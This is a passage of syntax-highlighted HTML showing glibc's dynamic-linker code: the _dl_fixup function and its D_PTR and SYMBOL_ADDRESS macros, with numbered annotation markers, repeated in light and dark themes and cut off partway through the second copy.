style="color:#1e754f">)</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">st_value</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">DL_FIXUP_VALUE_TYPE</span><br><span style="color:#393A34">attribute_hidden </span><span style="color:#59873A">__attribute</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">noinline</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#393A34"> DL_ARCH_FIXUP_ATTRIBUTE</span><br><span style="color:#59873A">_dl_fixup</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> link_map </span><span style="color:#AB5959">*</span><span style="color:#B07D48">l</span><span style="color:#999999">,</span><span style="color:#59873A"> ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Word</span><span style="color:#1e754f">)</span><span style="color:#B07D48"> reloc_arg</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  const</span><span style="color:#59873A"> ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Sym</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *const</span><span style="color:#393A34"> symtab</span><br><span style="color:#999999">    =</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">const</span><span style="color:#AB5959"> void</span><span style="color:#AB5959"> *</span><span style="color:#1e754f">)</span><span style="color:#59873A"> D_PTR</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">l</span><span style="color:#999999">,</span><span style="color:#B07D48"> l_info</span><span style="color:#a65e2b">[</span><span style="color:#393A34">DT_SYMTAB</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> *</span><span style="color:#393A34">strtab </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">const</span><span style="color:#AB5959"> void</span><span style="color:#AB5959"> *</span><span style="color:#1e754f">)</span><span style="color:#59873A"> D_PTR</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">l</span><span style="color:#999999">,</span><span style="color:#B07D48"> l_info</span><span style="color:#a65e2b">[</span><span style="color:#393A34">DT_STRTAB</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">  const</span><span style="color:#AB5959"> uintptr_t</span><span style="color:#393A34"> pltgot </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">uintptr_t</span><span style="color:#1e754f">)</span><span style="color:#59873A"> D_PTR</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">l</span><span style="color:#999999">,</span><span style="color:#B07D48"> l_info</span><span style="color:#a65e2b">[</span><span style="color:#393A34">DT_PLTGOT</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">  const</span><span style="color:#393A34"> PLTREL </span><span style="color:#AB5959">*const</span><span style="color:#393A34"> reloc</span><br><span style="color:#999999">    =</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">const</span><span style="color:#AB5959"> void</span><span style="color:#AB5959"> *</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">D_PTR</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">l</span><span style="color:#999999">,</span><span style="color:#B07D48"> l_info</span><span style="color:#a13865">[</span><span style="color:#393A34">DT_JMPREL</span><span style="color:#a13865">]</span><span style="color:#a65e2b">)</span><br><span style="color:#AB5959">		      +</span><span style="color:#59873A"> reloc_offset</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">pltgot</span><span style="color:#999999">,</span><span style="color:#393A34"> reloc_arg</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  const</span><span style="color:#59873A"> ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Sym</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#393A34">sym </span><span style="color:#999999">=</span><span style="color:#AB5959"> &#x26;</span><span style="color:#B07D48">symtab</span><span style="color:#1e754f">[</span><span style="color:#59873A">ELFW</span><span style="color:#a65e2b">(</span><span style="color:#393A34">R_SYM</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#B07D48">reloc</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">r_info</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  const</span><span style="color:#59873A"> ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Sym</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#393A34">refsym </span><span style="color:#999999">=</span><span style="color:#393A34"> sym</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  void</span><span style="color:#AB5959"> *const</span><span style="color:#393A34"> rel_addr </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">void</span><span style="color:#AB5959"> *</span><span style="color:#1e754f">)</span><span style="color:#1e754f">(</span><span style="color:#B07D48">l</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">l_addr</span><span style="color:#AB5959"> +</span><span style="color:#B07D48"> reloc</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">r_offset</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // [1]</span><br><span style="color:#998418">  lookup_t</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><br><span style="color:#393A34">  DL_FIXUP_VALUE_TYPE value</span><span style="color:#999999">;</span><br><br><span style="color:#A0ADA0">  /* Sanity check that we're really looking at a PLT relocation.  */</span><br><span style="color:#59873A">  assert</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">ELFW</span><span style="color:#a65e2b">(</span><span style="color:#393A34">R_TYPE</span><span style="color:#a65e2b">)</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">reloc</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">r_info</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> ELF_MACHINE_JMP_SLOT</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#A0ADA0">   /* Look up the target symbol.  If the normal lookup rules are not</span><br><span style="color:#A0ADA0">      used don't look in the global scope.  */</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">__builtin_expect</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#59873A">ELFW</span><span style="color:#a13865">(</span><span style="color:#393A34">ST_VISIBILITY</span><span style="color:#a13865">)</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#B07D48">sym</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">st_other</span><span style="color:#a13865">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#A0ADA0">  // [2]</span><br><span style="color:#999999">    </span><span style="color:#1e754f">{</span><br><span style="color:#AB5959">      const</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> r_found_version </span><span style="color:#AB5959">*</span><span style="color:#393A34">version </span><span style="color:#999999">=</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">;</span><br><br><span style="color:#1E754F">      if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#B07D48">l</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">l_info</span><span style="color:#a13865">[</span><span style="color:#59873A">VERSYMIDX</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#393A34">DT_VERSYM</span><span style="color:#bda437">)</span><span style="color:#a13865">]</span><span style="color:#AB5959"> !=</span><span style="color:#1E754F"> NULL</span><span style="color:#a65e2b">)</span><span style="color:#A0ADA0">  // [7]</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">{</span><br><span style="color:#AB5959">	  const</span><span style="color:#59873A"> ElfW</span><span style="color:#a13865">(</span><span style="color:#393A34">Half</span><span style="color:#a13865">)</span><span style="color:#AB5959"> *</span><span style="color:#393A34">vernum </span><span style="color:#999999">=</span><br><span style="color:#999999">	    </span><span style="color:#a13865">(</span><span style="color:#AB5959">const</span><span style="color:#AB5959"> void</span><span style="color:#AB5959"> *</span><span style="color:#a13865">)</span><span style="color:#59873A"> D_PTR</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#393A34">l</span><span style="color:#999999">,</span><span style="color:#B07D48"> l_info</span><span style="color:#bda437">[</span><span style="color:#59873A">VERSYMIDX</span><span style="color:#999999"> </span><span style="color:#296aa3">(</span><span style="color:#393A34">DT_VERSYM</span><span style="color:#296aa3">)</span><span style="color:#bda437">]</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">	  ElfW</span><span style="color:#a13865">(</span><span style="color:#393A34">Half</span><span style="color:#a13865">)</span><span style="color:#393A34"> ndx </span><span style="color:#999999">=</span><span style="color:#B07D48"> vernum</span><span style="color:#a13865">[</span><span style="color:#59873A">ELFW</span><span style="color:#bda437">(</span><span style="color:#393A34">R_SYM</span><span style="color:#bda437">)</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#B07D48">reloc</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">r_info</span><span style="color:#bda437">)</span><span style="color:#a13865">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7fff</span><span style="color:#999999">;</span><br><span style="color:#393A34">	  version </span><span style="color:#999999">=</span><span style="color:#AB5959"> &#x26;</span><span style="color:#B07D48">l</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">l_versions</span><span style="color:#a13865">[</span><span style="color:#393A34">ndx</span><span style="color:#a13865">]</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // [6]</span><br><span style="color:#1E754F">	  if</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#B07D48">version</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">hash</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 0</span><span style="color:#a13865">)</span><br><span style="color:#393A34">	    version </span><span style="color:#999999">=</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#a65e2b">}</span><br><br><span style="color:#393A34">		...</span><br><br><span style="color:#393A34">      result </span><span style="color:#999999">=</span><span style="color:#59873A"> _dl_lookup_symbol_x</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">strtab </span><span style="color:#AB5959">+</span><span style="color:#B07D48"> sym</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">st_name</span><span style="color:#999999">,</span><span style="color:#393A34"> l</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">sym</span><span style="color:#999999">,</span><span style="color:#B07D48"> l</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">l_scope</span><span style="color:#999999">,</span><br><span style="color:#393A34">				    version</span><span style="color:#999999">,</span><span style="color:#393A34"> ELF_RTYPE_CLASS_PLT</span><span style="color:#999999">,</span><span style="color:#393A34"> flags</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // [5]</span><br><br><span style="color:#393A34">		...</span><br><br><span style="color:#A0ADA0">      /* Currently result contains the base load address (or link map)</span><br><span style="color:#A0ADA0">	 of the object that defines sym.  Now add in the symbol</span><br><span style="color:#A0ADA0">	 offset.  */</span><br><span style="color:#393A34">      value </span><span style="color:#999999">=</span><span style="color:#59873A"> DL_FIXUP_MAKE_VALUE</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">result</span><span style="color:#999999">,</span><br><span style="color:#59873A">				   SYMBOL_ADDRESS</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#393A34">result</span><span style="color:#999999">,</span><span style="color:#393A34"> sym</span><span style="color:#999999">,</span><span style="color:#1E754F"> false</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // [3]</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  else</span><br><span style="color:#999999">    </span><span style="color:#1e754f">{</span><br><span style="color:#A0ADA0">      /* We already found the symbol.  The module (and therefore its load</span><br><span style="color:#A0ADA0">	 address) is also known.  */</span><br><span style="color:#393A34">      value </span><span style="color:#999999">=</span><span style="color:#59873A"> DL_FIXUP_MAKE_VALUE</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">l</span><span style="color:#999999">,</span><span style="color:#59873A"> SYMBOL_ADDRESS</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#393A34">l</span><span style="color:#999999">,</span><span style="color:#393A34"> sym</span><span style="color:#999999">,</span><span style="color:#1E754F"> true</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // [4]</span><br><span style="color:#393A34">      result </span><span style="color:#999999">=</span><span style="color:#393A34"> l</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#A0ADA0">  /* And now perhaps the relocation addend.  */</span><br><span style="color:#393A34">  value </span><span style="color:#999999">=</span><span style="color:#59873A"> elf_machine_plt_value</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">l</span><span style="color:#999999">,</span><span style="color:#393A34"> reloc</span><span style="color:#999999">,</span><span style="color:#393A34"> value</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#393A34">	...</span><br><br><span style="color:#A0ADA0">  /* Finally, fix up the plt itself.  */</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">__glibc_unlikely</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#59873A">GLRO</span><span style="color:#a13865">(</span><span style="color:#393A34">dl_bind_not</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> value</span><span style="color:#999999">;</span><br><br><span style="color:#1E754F">  return</span><span style="color:#59873A"> elf_machine_fixup_plt</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">l</span><span style="color:#999999">,</span><span style="color:#393A34"> result</span><span style="color:#999999">,</span><span style="color:#393A34"> refsym</span><span style="color:#999999">,</span><span style="color:#393A34"> sym</span><span style="color:#999999">,</span><span style="color:#393A34"> reloc</span><span style="color:#999999">,</span><span style="color:#393A34"> rel_addr</span><span style="color:#999999">,</span><span style="color:#393A34"> value</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#758575DD">/* All references to the value of l_info[DT_PLTGOT],</span><br><span style="color:#758575DD">  l_info[DT_STRTAB], l_info[DT_SYMTAB], l_info[DT_RELA],</span><br><span style="color:#758575DD">  l_info[DT_REL], l_info[DT_JMPREL], and l_info[VERSYMIDX (DT_VERSYM)]</span><br><span style="color:#758575DD">  have to be accessed via the D_PTR macro.  The macro is needed since for</span><br><span style="color:#758575DD">  most architectures the entry is already relocated - but for some not</span><br><span style="color:#758575DD">  and we need to relocate at access time.  */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> D_PTR</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">map</span><span style="color:#666666">,</span><span style="color:#BD976A"> i</span><span style="color:#5eaab5">)</span><span style="color:#C99076"> \</span><br><span style="color:#666666">  </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">map</span><span style="color:#4d9375">)</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">i</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">d_un</span><span style="color:#DBD7CAEE">.</span><span style="color:#BD976A">d_ptr</span><span style="color:#CB7676"> +</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">dl_relocate_ld</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">map</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> ?</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> :</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">map</span><span style="color:#d4976c">)</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">l_addr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> LOOKUP_VALUE_ADDRESS</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">map</span><span style="color:#666666">,</span><span style="color:#BD976A"> set</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">set</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> ||</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">map</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> ?</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">map</span><span style="color:#4d9375">)</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">l_addr</span><span style="color:#CB7676"> :</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD">/* Calculate the address of symbol REF using the base address from map MAP,</span><br><span style="color:#758575DD">   if non-NULL.  Don't check for NULL map if MAP_SET is TRUE.  */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> SYMBOL_ADDRESS</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">map</span><span style="color:#666666">,</span><span style="color:#BD976A"> ref</span><span style="color:#666666">,</span><span style="color:#BD976A"> map_set</span><span style="color:#5eaab5">)</span><span style="color:#C99076">				\</span><br><span style="color:#666666">  </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">ref</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> ==</span><span style="color:#4D9375"> NULL</span><span style="color:#CB7676"> ?</span><span style="color:#4C9A91"> 0</span><span style="color:#C99076">							\</span><br><span style="color:#CB7676">   :</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">__glibc_unlikely</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">ref</span><span style="color:#d9739f">)</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">st_shndx</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> SHN_ABS</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> ?</span><span style="color:#4C9A91"> 0</span><span style="color:#C99076">			\</span><br><span style="color:#CB7676">      :</span><span style="color:#80A665"> LOOKUP_VALUE_ADDRESS</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">map</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> map_set</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">ref</span><span style="color:#4d9375">)</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">st_value</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">DL_FIXUP_VALUE_TYPE</span><br><span style="color:#DBD7CAEE">attribute_hidden </span><span style="color:#80A665">__attribute</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">noinline</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#DBD7CAEE"> DL_ARCH_FIXUP_ATTRIBUTE</span><br><span style="color:#80A665">_dl_fixup</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> link_map </span><span style="color:#CB7676">*</span><span style="color:#BD976A">l</span><span style="color:#666666">,</span><span style="color:#80A665"> ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Word</span><span style="color:#4d9375">)</span><span style="color:#BD976A"> reloc_arg</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  const</span><span style="color:#80A665"> ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Sym</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *const</span><span style="color:#DBD7CAEE"> symtab</span><br><span style="color:#666666">    =</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> void</span><span style="color:#CB7676"> *</span><span style="color:#4d9375">)</span><span style="color:#80A665"> D_PTR</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">,</span><span style="color:#BD976A"> l_info</span><span style="color:#d4976c">[</span><span style="color:#DBD7CAEE">DT_SYMTAB</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">strtab </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> void</span><span style="color:#CB7676"> *</span><span style="color:#4d9375">)</span><span style="color:#80A665"> D_PTR</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">,</span><span style="color:#BD976A"> l_info</span><span style="color:#d4976c">[</span><span style="color:#DBD7CAEE">DT_STRTAB</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">  const</span><span style="color:#CB7676"> uintptr_t</span><span style="color:#DBD7CAEE"> pltgot </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">uintptr_t</span><span style="color:#4d9375">)</span><span style="color:#80A665"> D_PTR</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">,</span><span style="color:#BD976A"> l_info</span><span style="color:#d4976c">[</span><span style="color:#DBD7CAEE">DT_PLTGOT</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">  const</span><span style="color:#DBD7CAEE"> PLTREL </span><span style="color:#CB7676">*const</span><span style="color:#DBD7CAEE"> reloc</span><br><span style="color:#666666">    =</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> void</span><span style="color:#CB7676"> *</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">D_PTR</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">,</span><span style="color:#BD976A"> l_info</span><span style="color:#d9739f">[</span><span style="color:#DBD7CAEE">DT_JMPREL</span><span style="color:#d9739f">]</span><span style="color:#d4976c">)</span><br><span style="color:#CB7676">		      +</span><span style="color:#80A665"> reloc_offset</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">pltgot</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reloc_arg</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  const</span><span style="color:#80A665"> ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Sym</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">sym </span><span style="color:#666666">=</span><span style="color:#CB7676"> &#x26;</span><span style="color:#BD976A">symtab</span><span style="color:#4d9375">[</span><span style="color:#80A665">ELFW</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">R_SYM</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#BD976A">reloc</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">r_info</span><span style="color:#d4976c">)</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  const</span><span style="color:#80A665"> ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Sym</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">refsym </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> sym</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  void</span><span style="color:#CB7676"> *const</span><span style="color:#DBD7CAEE"> rel_addr </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">void</span><span style="color:#CB7676"> *</span><span style="color:#4d9375">)</span><span style="color:#4d9375">(</span><span style="color:#BD976A">l</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">l_addr</span><span style="color:#CB7676"> +</span><span style="color:#BD976A"> reloc</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">r_offset</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // [1]</span><br><span style="color:#B8A965">  lookup_t</span><span style="color:#DBD7CAEE"> result</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  DL_FIXUP_VALUE_TYPE value</span><span style="color:#666666">;</span><br><br><span style="color:#758575DD">  /* Sanity check that we're really looking at a PLT relocation.  */</span><br><span style="color:#80A665">  assert</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">ELFW</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">R_TYPE</span><span style="color:#d4976c">)</span><span style="color:#d4976c">(</span><span style="color:#BD976A">reloc</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">r_info</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> ELF_MACHINE_JMP_SLOT</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#758575DD">   /* Look up the target symbol.  If the normal lookup rules are not</span><br><span style="color:#758575DD">      used don't look in the global scope.  */</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">__builtin_expect</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#80A665">ELFW</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">ST_VISIBILITY</span><span style="color:#d9739f">)</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#BD976A">sym</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">st_other</span><span style="color:#d9739f">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#758575DD">  // [2]</span><br><span style="color:#666666">    </span><span style="color:#4d9375">{</span><br><span style="color:#CB7676">      const</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> r_found_version </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">version </span><span style="color:#666666">=</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">;</span><br><br><span style="color:#4D9375">      if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#BD976A">l</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">l_info</span><span style="color:#d9739f">[</span><span style="color:#80A665">VERSYMIDX</span><span style="color:#666666"> </span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">DT_VERSYM</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">]</span><span style="color:#CB7676"> !=</span><span style="color:#4D9375"> NULL</span><span style="color:#d4976c">)</span><span style="color:#758575DD">  // [7]</span><br><span style="color:#666666">	</span><span style="color:#d4976c">{</span><br><span style="color:#CB7676">	  const</span><span style="color:#80A665"> ElfW</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">Half</span><span style="color:#d9739f">)</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">vernum </span><span style="color:#666666">=</span><br><span style="color:#666666">	    </span><span style="color:#d9739f">(</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> void</span><span style="color:#CB7676"> *</span><span 